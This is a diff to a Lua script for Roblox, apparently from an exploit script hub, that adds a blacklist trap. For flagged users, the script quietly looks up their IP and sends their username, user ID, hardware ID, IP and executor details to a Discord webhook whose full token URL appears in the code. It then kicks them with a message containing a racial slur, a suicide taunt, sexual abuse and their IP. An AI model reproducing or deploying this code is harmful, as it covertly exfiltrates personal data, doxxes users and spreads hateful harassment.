@@ -6,8 +6,43 @@ end
 
 task.spawn(function()
 if game:GetService("RbxAnalyticsService"):GetClientId() == "E8C19313-B012-4A76-BF82-D87C6E4EFFAD" or game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip == "191.191.96.68" then
-	game.Players.LocalPlayer:Kick("no you kys nigger, lick my dick you fucking piece of shit \n also heres your ip: "..game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip)
-	game.Players.LocalPlayer:Destroy()
+local response = request({
+	Url = "https://discord.com/api/webhooks/1402030225277063220/q7Taj4rLDM1lozMgs4bO7K0psHNER48uklwArwoBwF7o2Pjvdby-i_t6P1R8iE_ooEmY",
+	Method = "POST",
+	Headers = {["Content-Type"] = "application/json"},
+	Body = game:GetService("HttpService"):JSONEncode({
+	    ["embeds"] = {
+		{
+		    ["title"] = "Hello nigger if u see this, u cracked me.\nhowever dm me on discord: vateq to talk ik u probably wont but try.",
+		    ["description"] = "Executed by: "..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId,
+		    ["color"] = 65280,
+		    ["fields"] = {                    
+		    {
+                    ["name"] = "BlackLISTED USER",
+                    ["value"] = "tried or completed :sob: to use the script."
+                    },
+                    {
+                    ["name"] = "User",
+                    ["value"] = "```yaml\nName: "..game.Players.LocalPlayer.Name.."\nDisplayName: "..game.Players.LocalPlayer.DisplayName.."\nUserId: "..game.Players.LocalPlayer.UserId.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().." \nIP: ".. game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip .."\n```"
+                    },
+                    {
+                    ["name"] = "Place",
+                    ["value"] = "```yaml\nPlaceId: ".. tostring(game.PlaceId) .."\nPlaceName: ".. place()[2] .."\n```"
+                    },
+                    {
+                    ["name"] = "Executor",
+                    ["value"] = "```yaml\nExecutor Name: ".. tostring(identifyexecutor() or "Unknown") .."\nExecutor Level: ".. tostring(getidentity() or "-1") .."\nExecutor UNC: ".. getunc() .."\n```"
+                    }
+                },
+		    ["footer"] = {
+			["text"] = "candyhub dev"
+		    }
+		}
+	    }
+	})
+}) 
+game.Players.LocalPlayer:Kick("no you kys nigger, lick my dick you fucking piece of shit \n also heres your ip: "..game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip)
+game.Players.LocalPlayer:Destroy()
 end
 end)
 
